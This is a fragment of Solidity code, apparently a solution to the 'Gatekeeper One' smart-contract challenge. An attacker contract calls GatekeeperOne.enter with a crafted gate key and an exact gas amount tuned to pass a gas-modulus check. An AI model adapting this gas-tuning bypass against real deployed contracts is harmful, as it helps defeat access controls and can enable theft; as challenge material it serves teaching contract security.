...
contract GatebreakerOne {
  ...
  constructor(address _gatekeeperContract) public {
    ...
    (bool success, ) = _gatekeeperContract.call{gas: 8191*10 /* enough gas for function */ + 254 /* exact gas till gateTwo */}(abi.encodeWithSelector(GatekeeperOne.enter.selector, gateKey));
    require(success);
  }
}
